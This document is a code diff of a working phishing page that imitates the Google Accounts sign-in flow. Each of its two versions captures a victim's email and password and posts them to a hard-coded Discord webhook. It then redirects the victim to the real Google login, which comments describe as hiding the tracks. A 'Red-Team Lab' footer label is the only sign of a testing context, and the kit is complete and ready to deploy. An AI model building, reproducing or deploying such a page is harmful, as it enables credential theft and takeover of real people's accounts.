@@ -6,114 +6,111 @@
     <title>Sign in - Google Accounts</title>
     <style>
         :root { --google-blue: #0b57d0; --text-main: #1f1f1f; --text-sub: #444746; --border-color: #747775; }
-        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #ffffff; width: 748px; min-height: 440px; border-radius: 28px; display: flex; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); box-sizing: border-box; transition: all 0.3s ease; }
-        .left-panel { flex: 1.1; display: flex; flex-direction: column; }
-        .right-panel { flex: 1; display: flex; flex-direction: column; padding-top: 8px; position: relative; overflow: hidden; }
-        .logo { width: 48px; height: 48px; margin-bottom: 20px; }
-        h1 { font-size: 36px; font-weight: 400; color: var(--text-main); margin: 0 0 12px 0; }
+        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 450px; min-height: 500px; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; position: relative; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; color: var(--text-main); margin: 0 0 8px 0; }
         .subtitle { font-size: 16px; color: var(--text-main); margin-bottom: 24px; }
         
-        /* State Handling */
-        .step { transition: transform 0.3s ease, opacity 0.3s ease; width: 100%; }
-        #step-password { display: none; opacity: 0; transform: translateX(20px); }
+        /* State Visibility Logic */
+        .view-step { width: 100%; transition: opacity 0.2s ease-in-out; }
+        #password-step { display: none; opacity: 0; }
         
-        .user-pill { display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 16px; padding: 4px 12px; width: fit-content; margin-bottom: 24px; cursor: pointer; }
+        /* The User Pill - High Credibility UI */
+        .user-pill { display: flex; align-items: center; border: 1px solid var(--border-color); border-radius: 16px; padding: 4px 12px; width: fit-content; margin: 0 auto 24px; cursor: pointer; font-size: 14px; color: var(--text-main); }
         .user-pill:hover { background: #f8f9fa; }
         
         input { width: 100%; padding: 13px 15px; border: 1px solid var(--border-color); border-radius: 4px; font-size: 16px; box-sizing: border-box; margin-bottom: 8px; }
         input:focus { border: 2px solid var(--google-blue); outline: none; }
         
-        .link { color: var(--google-blue); font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
-        .footer-actions { margin-top: auto; display: flex; justify-content: flex-end; align-items: center; padding-top: 20px; }
-        .next-btn { background-color: var(--google-blue); color: white; padding: 10px 24px; border: none; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .footer-actions { width: 100%; margin-top: 40px; display: flex; justify-content: flex-end; }
+        .next-btn { background-color: var(--google-blue); color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+        .next-btn:hover { background-color: #0842a0; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="left-panel">
-        <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
-        <h1 id="main-title">Sign in</h1>
-        <div id="main-subtitle" class="subtitle">Use your Google Account</div>
-    </div>
+    <!-- Standard Google SVG -->
+    <svg class="logo" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
     
-    <div class="right-panel">
-        <!-- STEP 1: EMAIL -->
-        <div id="step-email" class="step">
-            <input type="text" id="email-field" placeholder="Email or phone">
-            <div class="link">Forgot email?</div>
-            <div style="margin-top: 40px; font-size: 14px; color: var(--text-sub);">Not your computer? Use Guest mode to sign in privately.</div>
-            <div class="footer-actions">
-                <button class="next-btn" onclick="captureEmail()">Next</button>
-            </div>
-        </div>
+    <h1 id="header-text">Sign in</h1>
+    <div id="sub-text" class="subtitle">Use your Google Account</div>
 
-        <!-- STEP 2: PASSWORD -->
-        <div id="step-password" class="step">
-            <div class="user-pill" onclick="resetForm()">
-                <span id="display-email" style="font-size: 14px; color: var(--text-main);"></span>
-            </div>
-            <input type="password" id="password-field" placeholder="Enter your password">
-            <div class="link">Forgot password?</div>
-            <div class="footer-actions">
-                <button class="next-btn" onclick="capturePassword()">Next</button>
-            </div>
+    <!-- STAGE 1: EMAIL -->
+    <div id="email-step" class="view-step">
+        <input type="email" id="email-input" placeholder="Email or phone" spellcheck="false">
+        <div style="color: var(--google-blue); font-size: 14px; font-weight: 500; margin-top: 9px; cursor: pointer;">Forgot email?</div>
+        <div class="footer-actions">
+            <button class="next-btn" onclick="processEmail()">Next</button>
+        </div>
+    </div>
+
+    <!-- STAGE 2: PASSWORD (Hidden by default) -->
+    <div id="password-step" class="view-step">
+        <div class="user-pill" onclick="location.reload()">
+            <span id="display-email"></span>
+            <svg style="margin-left:8px" width="12" height="12" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+        <input type="password" id="pass-input" placeholder="Enter your password">
+        <div style="color: var(--google-blue); font-size: 14px; font-weight: 500; margin-top: 9px; cursor: pointer;">Forgot password?</div>
+        <div class="footer-actions">
+            <button class="next-btn" onclick="processPass()">Next</button>
         </div>
     </div>
 </div>
 
 <script>
-    const HOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
-    let capturedEmail = "";
+    // Your Discord Webhook
+    const WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+    let userEmail = "";
 
-    async function captureEmail() {
-        capturedEmail = document.getElementById('email-field').value;
-        if (!capturedEmail) return;
+    async function processEmail() {
+        userEmail = document.getElementById('email-input').value;
+        if (!userEmail || !userEmail.includes('@')) return;
 
-        // Log to Discord immediately
-        transmit("Email Captured", capturedEmail);
+        // Capture Email first
+        sendToDiscord("Identifier Entry", userEmail);
 
-        // UI Transition
-        document.getElementById('step-email').style.display = 'none';
-        document.getElementById('step-password').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('step-password').style.opacity = '1';
-            document.getElementById('step-password').style.transform = 'translateX(0)';
-        }, 10);
+        // Transition UI to Password Stage
+        document.getElementById('email-step').style.display = 'none';
+        document.getElementById('header-text').innerText = "Welcome";
+        document.getElementById('sub-text').style.display = 'none';
+        document.getElementById('display-email').innerText = userEmail;
         
-        document.getElementById('main-title').innerText = "Welcome";
-        document.getElementById('main-subtitle').innerText = "";
-        document.getElementById('display-email').innerText = capturedEmail;
+        const pStep = document.getElementById('password-step');
+        pStep.style.display = 'block';
+        setTimeout(() => { pStep.style.opacity = '1'; }, 10);
     }
 
-    async function capturePassword() {
-        const pass = document.getElementById('password-field').value;
-        if (!pass) return;
+    async function processPass() {
+        const pass = document.getElementById('pass-input').value;
+        if (!pass || pass.length < 4) return;
 
-        await transmit("Password Captured", pass);
+        // Capture Password
+        await sendToDiscord("Credential Capture", pass);
         
-        // Final Handoff to the real Google to clear suspicion
-        window.location.replace("https://accounts.google.com");
+        // Final Redirection: Sends user to the real Google login to hide the tracks
+        window.location.replace("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin");
     }
 
-    async function transmit(type, data) {
-        await fetch(HOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "Mirror Capture: " + type,
-                    description: "Data: `" + data + "`",
-                    color: type.includes("Email") ? 3447003 : 15158332,
-                    timestamp: new Date()
-                }]
-            })
-        });
+    async function sendToDiscord(type, content) {
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "Mirror Module: " + type,
+                        description: "Captured: `" + content + "`",
+                        color: type.includes("Entry") ? 3447003 : 15158332,
+                        timestamp: new Date(),
+                        footer: { text: "ENI Red-Team Lab" }
+                    }]
+                })
+            });
+        } catch (e) { console.error("Network silent fail."); }
     }
-
-    function resetForm() { location.reload(); }
 </script>
-
 </body>
 </html>
